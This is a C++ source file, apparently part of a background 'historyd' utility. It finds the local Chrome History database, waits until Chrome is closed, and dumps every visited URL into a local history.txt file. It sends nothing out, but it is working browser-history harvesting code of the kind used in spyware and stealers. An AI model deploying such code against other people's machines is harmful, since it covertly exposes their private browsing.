#include <Windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <cstdio>
#include <cstdlib>
#include <chrono>
#include <iostream>
#include <filesystem>

#include "sqlite/sqlite3.h"
#include "write.h"

int process_history(void *NotUsed, int argc, char **argv, char **azColName){
    for (short i = 0; i < argc; i++){
        write_endl(argv[i], "history.txt");
    }
    
    return 0;
}

void get_history(const char* histpath){
    sqlite3 *histdb;
    char *err = 0;
    int rc;
    std::string sql;
    rc = sqlite3_open(histpath, &histdb);



    if (rc){
        write_endl(sqlite3_errmsg(histdb), "history.txt");
        sqlite3_close(histdb);
    }

    sql = "SELECT url FROM urls;";
    sqlite3_exec(histdb, sql.c_str(), process_history, 0, &err);
}

bool check_chrome_running(){
    HANDLE hProcessSnap;
    HANDLE hProcess;
    PROCESSENTRY32 pe32;
    DWORD dwPriorityClass;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE){
        write_endl("Unable to detirmine if chrome is running. Waiting until next time to check.", "history.txt");
        return true;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if ( !Process32First(hProcessSnap, &pe32)){
        write_endl("Process32First error.", "history.txt");
        CloseHandle(hProcessSnap);
        return true;
    }

    do {
        char filename[256];
        if (strcmp(pe32.szExeFile, "chrome.exe") == 0){ 
            write_endl(pe32.szExeFile, "history.txt");
            //write_endl(" is not a ");
            return true;
        }
    }while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return false;
}

void init_historyd(){
    const char* appdatalocal_charptr = std::getenv("LOCALAPPDATA");
    std::string str_path = std::string(appdatalocal_charptr);
    str_path.append("\\Google\\Chrome\\User Data\\Default\\History");
    // write_endl(appdatalocal, "history.txt");
    
    std::filesystem::path historyfile{ str_path };
    //std::cout << "Checking if file exists..." << std::endl;
    write_endl(std::string("Checking for chrome installation"), "history.txt");

    if (std::filesystem::exists(historyfile)) {
        write_endl("Installation Exists", "history.txt");
        while(check_chrome_running()){
            write_endl("Chrome Process Running, will not continue", "history.txt");
        }
        get_history(str_path.c_str());
    } 
    else {
        write_endl("No installation, killing daemon.", "history.txt");
        return;
    }


}
